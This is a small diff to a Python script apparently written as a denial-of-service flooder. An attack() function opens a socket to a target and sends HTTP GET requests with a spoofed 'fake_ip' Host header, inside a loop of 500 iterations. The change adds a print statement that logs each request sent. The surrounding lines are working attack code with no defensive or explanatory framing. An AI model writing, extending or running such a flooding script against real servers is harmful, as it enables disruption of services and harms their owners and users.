@@ -11,6 +11,7 @@ def attack():
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        print(f"Sent request to {target} from fake IP {fake_ip}")
         s.close()
 
 for i in range(500):
